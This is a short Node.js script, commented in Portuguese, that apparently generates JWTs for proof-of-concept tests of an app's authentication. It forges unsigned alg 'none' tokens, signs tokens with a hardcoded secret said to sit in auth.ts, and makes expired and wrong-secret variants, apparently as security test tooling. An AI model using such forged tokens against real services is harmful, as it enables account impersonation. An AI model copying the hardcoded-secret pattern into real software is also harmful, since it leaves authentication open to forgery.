// Gerador de tokens para os PoCs. Sem libs externas: HMAC via crypto nativo.
const crypto = require('crypto');
const b64url = (buf) => Buffer.from(buf).toString('base64').replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
const SECRET = 'arara-2024'; // segredo fixo que está no auth.ts
function sign(payloadObj, {alg='HS256', secret=SECRET}={}) {
  const header = {alg, typ:'JWT'};
  const h = b64url(JSON.stringify(header));
  const p = b64url(JSON.stringify(payloadObj));
  if (alg === 'none') return `${h}.${p}.`;
  const sig = b64url(crypto.createHmac('sha256', secret).update(`${h}.${p}`).digest());
  return `${h}.${p}.${sig}`;
}
const mode = process.argv[2];
const sub  = process.argv[3] || 'm_0093';
if (mode === 'none')      console.log(sign({sub}, {alg:'none'}));
else if (mode === 'hs256')console.log(sign({sub, iat: Math.floor(Date.now()/1000)}));
else if (mode === 'expired') console.log(sign({sub, iat: 1700000000, exp: 1700003600})); // exp em nov/2023
else if (mode === 'badsecret') console.log(sign({sub}, {secret:'o-segredo-errado-do-atacante'}));
